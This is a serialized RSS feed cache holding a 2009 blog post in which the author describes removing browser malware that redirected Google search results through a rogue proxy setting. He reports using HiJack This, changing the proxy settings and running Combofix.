+After returning to Portland home and getting back to work this morning, my clicks into SERPS were still not coming up correctly `100% of the time, so I ran &#8220;Hijack This&#8221; again, and removed the offending entries that way. I&#8217;m sure I might have been able to solve it with enough time, but I really don&#8217;t have it to spare. All seems AOK now.</p>
+<p><strong>*Update &#8211; 12/07 noon</strong><br />
+Back in serps after email catchup, and.. Agghh &#8211; it&#8217;s back. My registry seems clean, the Hijack This logs still show clean, but I&#8217;m still being redirected about 10% of the time, even after a reboot.</p>
+<p>To be clear, here&#8217;s what I&#8217;ve done:</p>
+<ul>
+<li>Removed the obvious problem using Hijack This</li>
+<li>Manually verified removal from the registry</li>
+<li>Found over a dozen places undergoing troubleshooting</li>
+<li>Found one sales pitch disguised as a solution at Ezine Articles</li>
+<li>Using Google Wonder Wheel and Twitter Search but still found nothing concrete</li>
+</ul>
+<p>to be continued&#8230;</p>
+<p>12/8 -</p>
+<p>Thanks to my Twitter search,  I found someone who says below that Combofix worked for them, so I tried it from the <a href="http://www.bleepingcomputer.com/" target="_blank">only authorized US source for Combofix</a> .  Although the entire process tok more than two hours to run, in the end, I came out clean, and today I&#8217;m back to work. Hooray!</p>
+<p><a href="http://www.bleepingcomputer.com/combofix/how-to-use-combofix" target="_blank">Read (and print) these instructions carefully throughout the process</a></p>
+";}s:3:"wfw";a:1:{s:10:"commentrss";s:84:"http://www.pdxtc.com/wpblog/viruses-and-scams/google-search-results-redirected/feed/";}s:5:"slash";a:1:{s:8:"comments";s:1:"6";}s:7:"summary";s:324:"I was 45 minutes from leaving for the airport, moving stuff to my laptop, and tying up loose ends before traveling to Affiliate Convention. The last thing I needed was a computer problem.
+Update 12/8 &#8211; I just got back, and it&#8217;s not fixed! Please see the bottom of this post where I&#8217;ll continue to add [...]";s:12:"atom_content";s:7398:"<div class="tweetmeme_button" style="float: left; padding-right: 10px; padding-left: 10px; padding-bottom: 3px;"><a href="http://api.tweetmeme.com/share?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fviruses-and-scams%2Fgoogle-search-results-redirected%2F"><img src="http://api.tweetmeme.com/imagebutton.gif?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fviruses-and-scams%2Fgoogle-search-results-redirected%2F" height="61" width="51" /></a></div><p>I was 45 minutes from leaving for the airport, moving stuff to my laptop, and tying up loose ends before traveling to Affiliate Convention. The last thing I needed was a computer problem.</p>
+<p><span style="color: #000000;"><span style="text-decoration: line-through;"><em>Update 12/8 &#8211; I just got back, and it&#8217;s not fixed! Please see the bottom of this post where I&#8217;ll continue to add notes about resolution, or so see if  I give up <img src='http://www.pdxtc.com/wpblog/wp-includes/images/smilies/icon_wink.gif' alt=';)' class='wp-smiley' /> </em></span></span></p>
+<p><em><span style="color: #ff0000;">Update 12/8 &#8211; all fixed (apparently)</span></em><span style="text-decoration: line-through;"><em><span style="color: #ff0000;"><br />
+</span></em></span></p>
+<p>I did a Google site: search for an item at SearchEnginewatch.com to send to a client, but when I clicked the result, instead of the article, I ended up at a different site entirely. Huh?</p>
+<p>I hit the &#8220;back&#8221; button, tried the same SERP listing, and got a different page, almost as if it was randomized. Then I did a Google search for &#8220;dog food&#8221;, and from the the listings, 8 out of 10 results took me somewhere other than my intended destination. Something was REALLY wrong.</p>
+<p>That&#8217;s when it dawned on me that about 10 minutes earlier, I had a 20 &#8211; 30 second lockup while visiting some other website (No, I don&#8217;t know which), and my <a href="http://www.pdxtc.com/wpblog/computers-how-to/how-i-control-my-windows-performance/" target="_blank">Winpatrol</a> warning went off, asking me, &#8220;Do you want to add this item to your Windows Startup?&#8221; Although I said &#8220;No&#8221; apparently something slipped by, and my Firefox was screwed.</p>
+<p>Running out of time before leaving, I opened Internet Explorer, assuming it would be fine. Did a site: search at Google, and my SERPS had been hijacked in IE too.</p>
+<p>I began running Malware Bytes, a process that would take a couple of hours, and used my laptop to <a href="http://twitter.com/shendison/status/6270394461" target="_blank">Tweet out a message</a>, where @DavidKyle replied with a link to &#8220;Hijack This&#8221; which allows you to see registry additions.</p>
+<p>After spending 10 minutes in Hijack This checking boxes for things I KNEW things were fine, I added them to the &#8220;ignore&#8221; list, and was left with a couple dozen items to examine, but this was right at the top -</p>
+<p style="text-align: center;"><img class="aligncenter size-full wp-image-1510" title="hijack-large" src="http://www.pdxtc.com/wpblog/wp-content/uploads/hijack-large.jpg" alt="hijack-large" width="523" height="112" /></p>
+<p style="text-align: center;">
+<p style="text-align: left;">I browsed to my registry path, and yep, there it was, an IP address entered for proxy use.</p>
+<p>In case you don&#8217;t know, a proxy allows you to surf the web by going through their IP address. Reasons for CHOOSING to use a proxy vary, but in this case, it looked like the owner of the proxy IP was forcing me to go elsewhere, to other websites.</p>
+<p>I looked up thje owner of the IP address at Domain Tools, and it turned out to be owned by the University of Washington. Great &#8211; some bored kid, using the schoos resouirces to deliver who knows what sort of crap to my PC.</p>
+<p>I decided to let Malware Bytes continue to run rather than make any attempt at fixing it, and I left for the airport, dwelling on it all the way there.</p>
+<p>As soon as I made it past security, I logged in remotely to see if the Malware Byte scan had finished, and it hadn&#8217;t. Not only that, but it hadn&#8217;t found anything out of the norm, either.</p>
+<p>So, rather than use HiJack This to &#8220;fix&#8221; the problem by removing the registry entry, I decided to open Internet Explorer and went to the Proxy settings, where I saw the offending entry.</p>
+<p style="text-align: left;">
+<p style="text-align: left;"><img class="aligncenter size-full wp-image-1514" title="hijack-IE-proxy2" src="http://www.pdxtc.com/wpblog/wp-content/uploads/hijack-IE-proxy2.jpg" alt="hijack-IE-proxy2" width="382" height="336" /></p>
+<p style="text-align: left;">
+<p style="text-align: left;">The box was NOT checked to use a Proxy, however, I could see the offending IP in the grayed out section.</p>
+<p>All I had to do was check the box, delete the IP and port entries, hit OK, and then UNcheck the box again. I did a quick search at Google, and the problem was gone &#8211; Nice.</p>
+<p>I can&#8217;t say for sure that this fixed everything, and I&#8217;ll likely have to get into Firefox and do the same thing, but I&#8217;ll bet dollars to donuts that&#8217;s it.</p>
+<p>I was running IE8 and FF3, both patched with the absolute latest security fixes.  I have a firewall, AntiVirus, and a startup protector that SHOULD have prevented this problem. Apparently, we&#8217;re not as safe as we like to think.</p>
+<p>I&#8217;m writing this on the plane, but I&#8217;ll post it with screen shots when I get in later today &#8211; (right after I see if proxyaffiliatemarketing.com is available for registration <img src='http://www.pdxtc.com/wpblog/wp-includes/images/smilies/icon_wink.gif' alt=';)' class='wp-smiley' /> </p>
+<p><strong>*Update &#8211; 12/07 8am </strong><br />
+After returning to Portland home and getting back to work this morning, my clicks into SERPS were still not coming up correctly `100% of the time, so I ran &#8220;Hijack This&#8221; again, and removed the offending entries that way. I&#8217;m sure I might have been able to solve it with enough time, but I really don&#8217;t have it to spare. All seems AOK now.</p>
+<p><strong>*Update &#8211; 12/07 noon</strong><br />
+Back in serps after email catchup, and.. Agghh &#8211; it&#8217;s back. My registry seems clean, the Hijack This logs still show clean, but I&#8217;m still being redirected about 10% of the time, even after a reboot.</p>
+<p>To be clear, here&#8217;s what I&#8217;ve done:</p>
+<ul>
+<li>Removed the obvious problem using Hijack This</li>
+<li>Manually verified removal from the registry</li>
+<li>Found over a dozen places undergoing troubleshooting</li>
+<li>Found one sales pitch disguised as a solution at Ezine Articles</li>
+<li>Using Google Wonder Wheel and Twitter Search but still found nothing concrete</li>
+</ul>
+<p>to be continued&#8230;</p>
+<p>12/8 -</p>
+<p>Thanks to my Twitter search,  I found someone who says below that Combofix worked for them, so I tried it from the <a href="http://www.bleepingcomputer.com/" target="_blank">only authorized US source for Combofix</a> .  Although the entire process tok more than two hours to run, in the end, I came out clean, and today I&#8217;m back to work. Hooray!</p>
+<p><a href="http://www.bleepingcomputer.com/combofix/how-to-use-combofix" target="_blank">Read (and print) these instructions carefully throughout the process</a></p>
+";s:14:"date_timestamp";i:1259797040;}}s:7:"channel";a:7:{s:5:"title";s:38:"Search Commander Blog - Scott Hendison";s:4:"link";s:27:"http://www.pdxtc.com/wpblog";s:13:"lastbuilddate";s:31:"Wed, 10 Feb 2010 08:50:39 +0000";s:9:"generator";s:29:"http://wordpress.org/?v=2.9.1";s:8:"language";s:2:"en";s:2:"sy";a:2:{s:12:"updateperiod";s:6:"hourly";s:15:"updatefrequency";s:1:"1";}s:7:"tagline";N;}s:9:"textinput";a:0:{}s:5:"image";a:0:{}s:9:"feed_type";s:3:"RSS";s:12:"feed_version";s:3:"2.0";s:8:"encoding";s:10:"ISO-8859-1";s:16:"_source_encoding";s:0:"";s:5:"ERROR";s:0:"";s:7:"WARNING";s:0:"";s:19:"_CONTENT_CONSTRUCTS";a:6:{i:0;s:7:"content";i:1;s:7:"summary";i:2;s:4:"info";i:3;s:5:"title";i:4;s:7:"tagline";i:5;s:9:"copyright";}s:16:"_KNOWN_ENCODINGS";a:3:{i:0;s:5:"UTF-8";i:1;s:8:"US-ASCII";i:2;s:10:"ISO-8859-1";}s:5:"stack";a:0:{}s:9:"inchannel";b:0;s:6:"initem";b:0;s:9:"incontent";b:0;s:11:"intextinput";b:0;s:7:"inimage";b:0;s:17:"current_namespace";b:0;s:13:"last_modified";s:31:"Wed, 10 Feb 2010 08:50:39 GMT
+";s:4:"etag";s:36:""d6e5cba5c767e9c17acfd60b1cef93bc"
+";}
